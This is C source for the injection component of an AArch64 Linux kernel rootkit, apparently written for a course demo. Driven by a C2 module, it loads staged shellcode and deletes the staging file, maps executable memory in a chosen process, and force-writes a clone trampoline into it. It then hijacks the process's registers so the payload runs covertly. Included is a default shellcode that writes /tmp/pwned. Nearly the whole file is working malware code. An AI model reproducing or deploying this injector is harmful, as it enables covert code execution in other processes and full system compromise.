/*
 * inject.c: shellcode injection into userland processes
 *
 * Called from workqueue context (c2.c schedule_inject). Allocate memory
 * in the target process's address space, copy shellcode into it, redirect
 * the target's PC, and wake it. The target must survive; save the original
 * PC before redirecting so the shellcode can return (convention: x28).
 *
 * Shellcode source (priority order):
 *   1. C2_INJECT_STAGING (/tmp/secret/rk_sc): written by mykill before
 *      firing CMD_INJECT. Read and unlink here (workqueue = process context,
 *      safe to sleep). On demo day: mykill inject <pid> instructor.bin
 *   2. Hardcoded shellcode[] below: fallback for testing.
 *
 * Shellcode requirements: AArch64 PIC, ends with  mov x0, #-4; br x28
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/sched/mm.h>
#include <linux/sched/task.h>
#include <linux/pid.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/uaccess.h>
#include <linux/mman.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/namei.h>
#include <asm/ptrace.h>

#include "rootkit.h"

/* AArch64 instruction encoding helpers */

static u32 encode_movz(int rd, u16 imm16, int shift)
{
	int hw = shift / 16;
	return 0xD2800000 | (hw << 21) | ((u32)imm16 << 5) | rd;
}

static u32 encode_movk(int rd, u16 imm16, int shift)
{
	int hw = shift / 16;
	return 0xF2800000 | (hw << 21) | ((u32)imm16 << 5) | rd;
}

static u32 encode_svc(u16 imm)
{
	return 0xD4000001 | ((u32)imm << 5);
}

static u32 encode_br(int rn)
{
	return 0xD61F0000 | (rn << 5);
}

static u32 encode_movn(int rd, u16 imm16, int shift)
{
	int hw = shift / 16;
	return 0x92800000 | (hw << 21) | ((u32)imm16 << 5) | rd;
}

static u32 encode_cbz(int rt, int offset_insns)
{
	u32 imm19 = (u32)(offset_insns & 0x7FFFF);
	return 0xB4000000 | (imm19 << 5) | rt;
}

static int emit_load_imm64(u32 *buf, int idx, int rd, unsigned long addr)
{
	buf[idx++] = encode_movz(rd, (addr >> 0) & 0xFFFF, 0);
	buf[idx++] = encode_movk(rd, (addr >> 16) & 0xFFFF, 16);
	buf[idx++] = encode_movk(rd, (addr >> 32) & 0xFFFF, 32);
	buf[idx++] = encode_movk(rd, (addr >> 48) & 0xFFFF, 48);
	return idx;
}


/* Clone trampoline builder */

static int build_trampoline(u32 *buf, unsigned long stack_va)
{
	int i = 0;
	unsigned long stack_top = stack_va + PAGE_SIZE - 16;

	/* x0 = CLONE_VM(0x100)|CLONE_THREAD(0x10000)|CLONE_SIGHAND(0x800) = 0x10900 */
	buf[i++] = encode_movz(0, 0x0900, 0);
	buf[i++] = encode_movk(0, 0x0001, 16);

	i = emit_load_imm64(buf, i, 1, stack_top);   /* x1 = stack top */

	buf[i++] = encode_movz(2, 0, 0);              /* x2 = 0 (parent_tidptr) */
	buf[i++] = encode_movz(3, 0, 0);              /* x3 = 0 (tls) */
	buf[i++] = encode_movz(4, 0, 0);              /* x4 = 0 (child_tidptr) */
	buf[i++] = encode_movz(8, 220, 0);            /* x8 = __NR_clone */
	buf[i++] = encode_svc(0);

	buf[i++] = encode_cbz(0, 3);                  /* cbz x0, child (+3) */
	buf[i++] = encode_movn(0, 3, 0);              /* parent: x0 = ~3 = -4 = -EINTR */
	buf[i++] = encode_br(28);                     /* parent: br x28 */
	buf[i++] = encode_br(27);                     /* child:  br x27 */

	return i;
}

/*
 * Default test shellcode: assembled from tools/inject_test.S
 * Creates /tmp/pwned with "INJECTED-1337 pid=<pid> ppid=<ppid>"
 * then returns via br x28.
 */
static const unsigned char shellcode_default[] = {
	0xfd, 0x7b, 0xbf, 0xa9, 0xf3, 0x53, 0xbf, 0xa9, 0xf5, 0x5b, 0xbf, 0xa9,
	0x88, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf3, 0x03, 0x00, 0xaa,
	0xa8, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf4, 0x03, 0x00, 0xaa,
	0x60, 0x0c, 0x80, 0x92, 0x41, 0x08, 0x00, 0x10, 0x22, 0x48, 0x80, 0xd2,
	0x02, 0x00, 0xa0, 0xf2, 0x83, 0x34, 0x80, 0xd2, 0x08, 0x07, 0x80, 0xd2,
	0x01, 0x00, 0x00, 0xd4, 0xf5, 0x03, 0x00, 0xaa, 0xbf, 0x02, 0x00, 0xf1,
	0xab, 0x06, 0x00, 0x54, 0x61, 0x07, 0x00, 0x70, 0x62, 0x02, 0x80, 0xd2,
	0xe0, 0x03, 0x15, 0xaa, 0x08, 0x08, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
	0xff, 0x83, 0x00, 0xd1, 0xe0, 0x03, 0x13, 0xaa, 0xe1, 0x7f, 0x00, 0x91,
	0x02, 0x00, 0x80, 0xd2, 0x22, 0x00, 0x00, 0x39, 0x43, 0x01, 0x80, 0xd2,
	0x04, 0x08, 0xc3, 0x9a, 0x85, 0x80, 0x03, 0x9b, 0xa5, 0xc0, 0x00, 0x91,
	0x21, 0x04, 0x00, 0xd1, 0x25, 0x00, 0x00, 0x39, 0x42, 0x04, 0x00, 0x91,
	0xe0, 0x03, 0x04, 0xaa, 0x00, 0xff, 0xff, 0xb5, 0xe0, 0x03, 0x15, 0xaa,
	0x08, 0x08, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x41, 0x05, 0x00, 0x30,
	0xc2, 0x00, 0x80, 0xd2, 0xe0, 0x03, 0x15, 0xaa, 0x08, 0x08, 0x80, 0xd2,
	0x01, 0x00, 0x00, 0xd4, 0xe1, 0x7f, 0x00, 0x91, 0x02, 0x00, 0x80, 0xd2,
	0x22, 0x00, 0x00, 0x39, 0xe0, 0x03, 0x14, 0xaa, 0x43, 0x01, 0x80, 0xd2,
	0x04, 0x08, 0xc3, 0x9a, 0x85, 0x80, 0x03, 0x9b, 0xa5, 0xc0, 0x00, 0x91,
	0x21, 0x04, 0x00, 0xd1, 0x42, 0x04, 0x00, 0x91, 0x25, 0x00, 0x00, 0x39,
	0xe0, 0x03, 0x04, 0xaa, 0x00, 0xff, 0xff, 0xb5, 0xe0, 0x03, 0x15, 0xaa,
	0x08, 0x08, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xc1, 0x02, 0x00, 0x70,
	0x22, 0x00, 0x80, 0xd2, 0xe0, 0x03, 0x15, 0xaa, 0x08, 0x08, 0x80, 0xd2,
	0x01, 0x00, 0x00, 0xd4, 0xff, 0x83, 0x00, 0x91, 0xe0, 0x03, 0x15, 0xaa,
	0x28, 0x07, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf5, 0x5b, 0xc1, 0xa8,
	0xf3, 0x53, 0xc1, 0xa8, 0xfd, 0x7b, 0xc1, 0xa8, 0x60, 0x00, 0x80, 0x92,
	0x80, 0x03, 0x1f, 0xd6, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x70, 0x77, 0x6e,
	0x65, 0x64, 0x00, 0x49, 0x4e, 0x4a, 0x45, 0x43, 0x54, 0x45, 0x44, 0x2d,
	0x31, 0x33, 0x33, 0x37, 0x20, 0x70, 0x69, 0x64, 0x3d, 0x20, 0x70, 0x70,
	0x69, 0x64, 0x3d, 0x0a
};


/* find_exec_addr */ 
//Find a VM_EXEC page in the target's address space suitable for writing the clone trampoline.
//Returns an address 0x100 bytes into the first exec VMA that has enough room, or 0 on failure.

static unsigned long find_exec_addr(struct task_struct *task, size_t need)
{
	struct vm_area_struct *vma;
	unsigned long addr = 0;

	if (!task->mm)
		return 0;

	mmap_read_lock(task->mm);
	VMA_ITERATOR(iter, task->mm, 0);
	for_each_vma(iter, vma) {
		if (!(vma->vm_flags & VM_EXEC))
			continue;
		if (vma->vm_start + 0x100 + need > vma->vm_end)
			continue;
		addr = vma->vm_start + 0x100;
		break;
	}
	mmap_read_unlock(task->mm);
	return addr;
}

/*
 * load_staged_shellcode - read shellcode from C2_INJECT_STAGING and unlink it.
 *
 * Called from workqueue (process context) so kernel_read and vfs_unlink are
 * both safe. Returns a kmalloc'd buffer the caller must kfree, or NULL if the
 * staging file is absent (fall back to shellcode_default).
 */
static void *load_staged_shellcode(size_t *len_out)
{
	struct file *f;
	struct path p;
	struct dentry *parent;
	loff_t size;
	void *buf;
	ssize_t n;

	f = filp_open(C2_INJECT_STAGING, O_RDONLY, 0);
	if (IS_ERR(f))
		return NULL;

	size = i_size_read(file_inode(f));
	if (size <= 0 || size > 65536) {
		filp_close(f, NULL);
		return NULL;
	}

	buf = kmalloc(size, GFP_KERNEL);
	if (!buf) {
		filp_close(f, NULL);
		return NULL;
	}

	n = kernel_read(f, buf, size, &(loff_t){0});
	filp_close(f, NULL);

	if (n != size) {
		kfree(buf);
		return NULL;
	}

	/* Unlink the staging file it's served its purpose */
	if (!kern_path(C2_INJECT_STAGING, 0, &p)) {
		parent = dget_parent(p.dentry);
		inode_lock(d_inode(parent));
		vfs_unlink(mnt_idmap(p.mnt), d_inode(parent), p.dentry, NULL);
		inode_unlock(d_inode(parent));
		dput(parent);
		path_put(&p);
	}

	*len_out = size;
	pr_info("[rootkit] loaded %zd bytes from staging file\n", n);
	return buf;
}

int inject_trigger(pid_t target)
{
	struct task_struct *task;
	struct mm_struct *mm;
	struct pt_regs *regs;
	unsigned long inject_addr, stack_addr, exec_addr;
	void *sc_buf = NULL;
	size_t sc_len = 0;
	bool sc_allocated = false;
	u32 trampoline[32];
	int tramp_len, ret;
 
	rcu_read_lock();
	task = pid_task(find_vpid(target), PIDTYPE_PID);
	if (task)
		get_task_struct(task);
	rcu_read_unlock();
 
	if (!task) {
		pr_err("[inject] PID %d not found\n", target);
		return -ESRCH;
	}
 
	mm = task->mm;
	if (!mm) {
		pr_err("[inject] PID %d has no mm\n", target);
		put_task_struct(task);
		return -EINVAL;
	}
 
	pr_info("[inject] target PID %d (%s)\n", target, task->comm);
 
 
	sc_buf = load_staged_shellcode(&sc_len);
	if (sc_buf) {
		sc_allocated = true;
	} else {
		sc_buf = (void *)shellcode_default;
		sc_len = sizeof(shellcode_default);
		pr_info("[inject] using default shellcode (%zu bytes)\n", sc_len);
	}
 
 
	mmgrab(mm);
	kthread_use_mm(mm);
 
	inject_addr = vm_mmap(NULL, 0, PAGE_SIZE,
			     PROT_READ | PROT_WRITE | PROT_EXEC,
			     MAP_ANONYMOUS | MAP_PRIVATE, 0);
	if (IS_ERR_VALUE(inject_addr)) {
		pr_err("[inject] code vm_mmap failed: %ld\n", (long)inject_addr);
		ret = (int)inject_addr;
		goto out_unuse;
	}
	pr_info("[inject] code page at %lx\n", inject_addr);
 
	if (copy_to_user((void __user *)inject_addr, sc_buf, sc_len)) {
		pr_err("[inject] copy_to_user (code) failed\n");
		ret = -EFAULT;
		goto out_unuse;
	}
 
	stack_addr = vm_mmap(NULL, 0, PAGE_SIZE,
			    PROT_READ | PROT_WRITE,
			    MAP_ANONYMOUS | MAP_PRIVATE, 0);
	if (IS_ERR_VALUE(stack_addr)) {
		pr_err("[inject] stack vm_mmap failed: %ld\n", (long)stack_addr);
		ret = (int)stack_addr;
		goto out_unuse;
	}
	pr_info("[inject] stack page at %lx\n", stack_addr);
 
	kthread_unuse_mm(mm);
	mmdrop(mm);
 
	tramp_len = build_trampoline(trampoline, stack_addr);
 
	exec_addr = find_exec_addr(task, tramp_len * sizeof(u32));
	if (!exec_addr) {
		pr_err("[inject] no exec region found in PID %d\n", target);
		ret = -ENOMEM;
		goto out_put;
	}
 
	ret = access_process_vm(task, exec_addr, trampoline,
				tramp_len * sizeof(u32),
				FOLL_WRITE | FOLL_FORCE);
	if (ret != tramp_len * (int)sizeof(u32)) {
		pr_err("[inject] trampoline write failed: %d\n", ret);
		ret = -EIO;
		goto out_put;
	}
	pr_info("[inject] trampoline at %lx\n", exec_addr);
 
	/* --- 6. Hijack target registers --- */
 
	regs = task_pt_regs(task);
	regs->regs[28] = regs->pc;       /* save original PC for parent return */
	regs->regs[27] = inject_addr;    /* payload VA for child */
	regs->pc = exec_addr;            /* redirect to trampoline */
	regs->syscallno = -1;          /* prevent syscall restart */
 
	/* Force target to wake and return to userspace */
	set_tsk_thread_flag(task, TIF_SIGPENDING);
	wake_up_process(task);
 
	pr_info("[inject] injection complete: PID %d code=%lx tramp=%lx\n",
		target, inject_addr, exec_addr);
 
	if (sc_allocated)
		kfree(sc_buf);
	put_task_struct(task);
	return 0;
 
out_unuse:
	kthread_unuse_mm(mm);
	mmdrop(mm);
out_put:
	if (sc_allocated)
		kfree(sc_buf);
	put_task_struct(task);
	return ret;
}

int inject_init(void)
{
	pr_info("[inject] injection subsystem ready\n");
	return 0;
}

void inject_exit(void)
{
	pr_info("[inject] injection subsystem cleaned up\n");
}